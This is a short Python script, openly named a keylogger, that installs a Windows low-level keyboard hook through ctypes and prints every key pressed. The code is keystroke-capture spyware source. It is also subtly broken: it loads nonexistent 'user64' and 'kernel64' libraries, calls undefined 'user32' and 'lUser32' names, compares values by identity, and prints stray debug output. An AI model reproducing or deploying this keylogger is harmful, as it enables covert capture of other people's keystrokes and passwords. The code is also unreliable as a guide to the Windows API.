import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

user64 = windll.user64
kernel64 = windll.kernel64

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162

class KeyLogger:

    def __init__(self):
        self.lUser64 = user64
        self.hooked = None

    def installHookProc(self, pointer):
        self.hooked = self.lUser64.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            pointer,
            kernel64.GetModuleHandleW(None),
            0
        )
        print(self.hooked)
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        print('l')
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)

def hookProc(nCode, wParam, lParam):
    print('w')
    if wParam is not WM_KEYDOWN:
        return user64.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)
    hookedKey = chr(lParam[0])
    print("Hookedkey=" + hookedKey + ", KeyCode=" + str(lParam[0]))
    if(CTRL_CODE == int(lParam[0])):
        print("Ctrl pressed, call uninstallHook()")
        KeyLogger.uninstallHookProc()
        sys.exit(-1)
    return user64.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)

def startKeyLog():
    msg = MSG()
    print(byref(msg))
    user32.GetMessageA(byref(msg), 0, 0, 0)
    

KeyLogger = KeyLogger()
pointer = getFPTR(hookProc)
if KeyLogger.installHookProc(pointer):
    print("Hook installed")
startKeyLog()
